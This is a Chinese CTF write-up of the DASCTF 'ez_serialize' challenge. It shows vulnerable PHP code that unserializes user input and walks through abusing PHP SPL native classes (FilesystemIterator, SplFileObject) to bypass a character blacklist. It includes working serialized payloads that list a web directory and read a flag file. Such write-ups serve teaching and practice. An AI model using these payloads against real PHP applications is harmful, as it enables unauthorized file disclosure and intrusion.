---

title: DASCTF总结——php原生类在反序列化的利用

date: 2021-04-05 16:57:27

tags: 练习

categories: test59

---
上次打DASCTF比赛的题目还是有很多没有见过的新的知识点的，这几天开始复现了，那么就总结一下。  

首先就是php原生类在反序列的利用，这个是第一次见。  

#  ez_serialize  

打开题目，得到源码：  

	<?php
	error_reporting(0);
	highlight_file(__FILE__);
	
	class A{
    public $class;
    public $para;
    public $check;
    public function __construct()
    {
        $this->class = "B";
        $this->para = "ctfer";
        echo new  $this->class ($this->para);
    }
    public function __wakeup()
    {
        $this->check = new C;
        if($this->check->vaild($this->para) && $this->check->vaild($this->class)) {
            echo new  $this->class ($this->para);
        }
        else
            die('bad hacker~');
    }

	}
	class B{
    var $a;
    public function __construct($a)
    {
        $this->a = $a;
        echo ("hello ".$this->a);
    }
	}
	class C{

    function vaild($code){
        $pattern = '/[!|@|#|$|%|^|&|*|=|\'|"|:|;|?]/i';
        if (preg_match($pattern, $code)){
            return false;
        }
        else
            return true;
    }
	}


	if(isset($_GET['pop'])){
    unserialize($_GET['pop']);
	}
	else{
    $a=new A;

	} 
	hello ctfer 

一眼就能看出是反序列化，但是在仔细看却傻眼了，这代码里面找不到可以执行命令语句的函数漏洞，也找不到可以反弹shell的方法，这样看来就只是一串反序列化代码罢了。  

那么我们就先分析一下代码吧。  

首先是A类

	class A{
    public $class;
    public $para;
    public $check;
    public function __construct()
    {
        $this->class = "B";
        $this->para = "ctfer";
        echo new  $this->class ($this->para);
    }
    public function __wakeup()
    {
        $this->check = new C;
        if($this->check->vaild($this->para) && $this->check->vaild($this->class)) {
            echo new  $this->class ($this->para);
        }
        else
            die('bad hacker~');
    }  

定义了三个变量，里面有一个__wakeup()方法，也就是说如果调用A类就会先调用这个方法，我们来看一下这个方法的操作。  

	$this->check = new C;
        if($this->check->vaild($this->para) && $this->check->vaild($this->class)) {
            echo new  $this->class ($this->para);
        }
        else
            die('bad hacker~');

可以看到，它先调用了C类，然后进行一个if判断语句，并且调用了C类中的vaild函数。如果判断为真，那么就执行输出$this->class ($this->para)这样的形式。  

那么我们接下来就分析C类代码：  

	class C{

    function vaild($code){
        $pattern = '/[!|@|#|$|%|^|&|*|=|\'|"|:|;|?]/i';
        if (preg_match($pattern, $code)){
            return false;
        }
        else
            return true;
    }
	}

很明显，C类中的vaild函数是一个正则匹配，匹配传入的参数。也就是A类中的$para,$class，如果匹配到黑名单中的字符，就返回false，没有就返回ture。  

接着我们看回A类，可以看到一开始默认设置的$class和$para:  

	public $class;
    public $para;
    public $check;
    public function __construct()
    {
        $this->class = "B";
        $this->para = "ctfer";
        echo new  $this->class ($this->para);
    }  

最开始默认的是给class赋值为B类，para赋值为ctfer，那么我们来看B类具体是什么。  

	class B{
    var $a;
    public function __construct($a)
    {
        $this->a = $a;
        echo ("hello ".$this->a);
    }
	} 

B类很简单，接受一个传入的参数a，然后打印"hello $a"。  

至此我们可以整理一下这个反序列化的大体思路，我们给A类中的$class.$para赋值，然后这两个属性经过C类中的正则匹配，如果没问题，那么就会执行形如class(para)这样的类的调用或者函数调用。  

一开始的想法肯定是构造命令执行函数，比如赋值class=syste；para='ls'，但是这样无法通过正则匹配，而这个反序列化中也找不到别的危险函数，那么该怎么做呢？  

**这里就要用到php中的原生类了。**   

由名字就可以知道，原生类就是php本来内置的类，这些类中的某些是可以被我们所利用的。  

	SLP类中存在能够进行文件处理和迭代的类：
	
	类	                 描述
	DirectoryIterator	遍历目录
	FilesystemIterator	遍历目录
	GlobIterator	    遍历目录，但是不同的点在于它可以通配例如/var/html/www/flag*
	SplFileObject	    读取文件，按行读取，多行需要遍历
	finfo/finfo_open()	需要两个参数   

这个是一部分我们能利用的，而这道题我们就要用到它们。  

首先我们要读取目录，因为system()等函数无法使用，那么我们就使用FilesystemIterator这个原生类来历遍目录，那么我们这样构造pop：  

	<?php
	class A{
    public $class='FilesystemIterator';
    public $para="/var/www/html";
    public $check;
    }
	$o  = new A();
	echo serialize($o);
	?>  

构造payload:   

	/?pop=O:1:"A":3:{s:5:"class";s:18:"FilesystemIterator";s:4:"para";s:13:"/var/www/html";s:5:"check";N;}  

得到目录下文件  

[![](https://img.imgdb.cn/item/606dd6ae8322e6675c570362.png)](https://img.imgdb.cn/item/606dd6ae8322e6675c570362.png)  

flag就在这个文件夹中，名字使flag.php那么我们用SplFileObject	这个原生类构造pop链：  

	<?php
	class A{
    public $class='SplFileObject';
    public $para="/var/www/html/1aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErE/flag.php";
    public $check;
    }

	$o  = new A();
	echo serialize($o);
	?>  

构造payload：  

	/?pop=O:1:"A":3:{s:5:"class";s:13:"SplFileObject";s:4:"para";s:56:"/var/www/html/1aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErE/flag.php";s:5:"check";N;}   

得到flag。  

[![](https://img.imgdb.cn/item/606dd7618322e6675c57e9fc.png)](https://img.imgdb.cn/item/606dd7618322e6675c57e9fc.png)  

# 小结  

这道题给了我一个新的解决php反序列化题目的思路，那就是利用php中内置的原生类，当我们发现代码中没有什么危险函数时就可以考虑这个方法，这样就可以不通过危险函数也能读取文件内容。  

关于php原生类的题目目前遇到的还少，以后遇到再接着补充。  

附上原生类链接：  

[PHP标准库 (SPL)](https://www.php.net/manual/zh/book.spl.php)